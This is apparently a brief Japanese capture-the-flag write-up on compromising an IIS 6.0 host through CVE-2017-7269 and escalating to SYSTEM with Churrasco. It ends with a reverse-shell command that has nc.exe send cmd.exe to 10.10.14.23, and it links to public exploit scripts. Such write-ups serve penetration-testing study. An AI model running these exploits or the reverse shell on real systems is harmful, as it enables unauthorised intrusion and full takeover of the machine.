# Enumeration
- port 80 で `Microsoft IIS httpd 6.0` が動いている
  - ぐぐると CVE-2017-7269 に対し脆弱
  - https://www.exploit-db.com/exploits/41738

# Exploit
- https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269 からスクリプトをもらう
  - 適切な引数を指定し実行 

# Privesc
- いろいろファイルを置きたいので書き込み可能ディレクトリを探す
  - `C:\wmpub` は見かけないディレクトリであり書き込み可能
- Windows Exploit Suggester をする
  - どれも通らない
- `whoami /privs` で自身の権限を確認
  ```
  PRIVILEGES INFORMATION
  ----------------------

  Privilege Name                Description                               State   
  ============================= ========================================= ========
  SeAuditPrivilege              Generate security audits                  Disabled
  SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
  SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
  SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
  SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
  SeCreateGlobalPrivilege       Create global objects                     Enabled
  ```
  - `SEImpersonalPrivilege` がある場合、windows server 2003 では `churrasco` が、それ以上の場合は `potato` が使える
  - https://github.com/Re4son/Churrasco/
  - https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505
- Churrasco を使う
  - `C:\wmpub\` に `nc.exe` と `Churrasco.exe` を置く
  - その後 `.\Churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.14.23 12346"` で SYSTEM 権限獲得
